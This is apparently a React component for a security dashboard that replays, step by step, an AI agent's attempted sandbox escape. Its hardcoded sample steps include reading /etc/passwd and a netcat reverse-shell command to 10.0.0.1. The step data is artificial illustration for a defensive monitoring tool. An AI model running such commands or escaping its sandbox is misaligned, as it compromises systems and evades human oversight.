"use client";

import { useState } from 'react';
import { ShieldAlert, Play, Pause, RotateCcw, X, AlertTriangle, CheckCircle, Terminal } from 'lucide-react';

interface AutopsyReplayModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function AutopsyReplayModal({ isOpen, onClose }: AutopsyReplayModalProps) {
  const [currentStep, setCurrentStep] = useState(0);
  const [isPlaying, setIsPlaying] = useState(false);

  if (!isOpen) return null;

  const trajectorySteps = [
    { turn: 1, action: "Reconnaissance", tool: "list_files", status: "SAFE", risk: 10, detail: "Agent listed /tmp sandbox directory." },
    { turn: 2, action: "Reconnaissance", tool: "read_config", status: "SAFE", risk: 25, detail: "Agent retrieved non-sensitive app config." },
    { turn: 3, action: "Privilege Escalation", tool: "cat /etc/passwd", status: "WARNING", risk: 65, detail: "Agent attempted sensitive credential harvest." },
    { turn: 4, action: "Autonomous Sandbox Escape", tool: "nc -e /bin/sh 10.0.0.1 4444", status: "CRITICAL", risk: 95, detail: "Reverse shell egress attempt BLOCKED by EDS engine." },
  ];

  return (
    <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
      <div className="bg-soc-surface border border-soc-border rounded-2xl w-full max-w-3xl overflow-hidden shadow-2xl space-y-4 p-6">
        {/* Modal Header */}
        <div className="flex items-center justify-between border-b border-soc-border pb-4">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-xl bg-soc-critical/20 text-soc-critical border border-soc-critical/40">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-extrabold text-soc-text font-mono flex items-center gap-2">
                AUTOPSY MODE — Sandbox Escape Trajectory Replay
              </h2>
              <p className="text-xs text-soc-muted">
                Cinematic step-by-step forensic analysis of autonomous agent privilege escalation.
              </p>
            </div>
          </div>

          <button onClick={onClose} className="p-1.5 rounded-lg bg-soc-elevated text-soc-muted hover:text-soc-text transition">
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Step Visualizer */}
        <div className="space-y-3">
          <div className="flex items-center justify-between text-xs font-mono text-soc-muted">
            <span>Trajectory Step: {currentStep + 1} / {trajectorySteps.length}</span>
            <span className={`px-2 py-0.5 rounded font-bold ${
              trajectorySteps[currentStep].risk >= 70 ? 'badge-critical' : 'badge-low'
            }`}>
              Containment Risk: {trajectorySteps[currentStep].risk} / 100
            </span>
          </div>

          {/* Current Step Banner */}
          <div className="p-4 rounded-xl bg-soc-bg border border-soc-border space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-soc-accent font-mono uppercase">
                Turn {trajectorySteps[currentStep].turn}: {trajectorySteps[currentStep].action}
              </span>
              <span className="text-xs font-mono font-bold text-soc-critical">
                Tool: {trajectorySteps[currentStep].tool}
              </span>
            </div>
            <p className="text-xs font-mono text-soc-text bg-soc-surface p-3 rounded-lg border border-soc-border">
              {trajectorySteps[currentStep].detail}
            </p>
          </div>
        </div>

        {/* Controls */}
        <div className="flex items-center justify-between pt-2 border-t border-soc-border font-mono text-xs">
          <div className="flex items-center gap-2">
            <button
              onClick={() => setCurrentStep(Math.max(0, currentStep - 1))}
              disabled={currentStep === 0}
              className="px-3 py-1.5 rounded-lg bg-soc-elevated border border-soc-border text-soc-text disabled:opacity-40"
            >
              Previous
            </button>
            <button
              onClick={() => setCurrentStep(Math.min(trajectorySteps.length - 1, currentStep + 1))}
              disabled={currentStep === trajectorySteps.length - 1}
              className="px-3 py-1.5 rounded-lg bg-soc-accent text-white font-bold disabled:opacity-40"
            >
              Next Step
            </button>
          </div>

          <button
            onClick={() => setCurrentStep(0)}
            className="px-3 py-1.5 rounded-lg bg-soc-surface border border-soc-border text-soc-muted hover:text-soc-text flex items-center gap-1.5"
          >
            <RotateCcw className="w-3.5 h-3.5" /> Restart Replay
          </button>
        </div>
      </div>
    </div>
  );
}
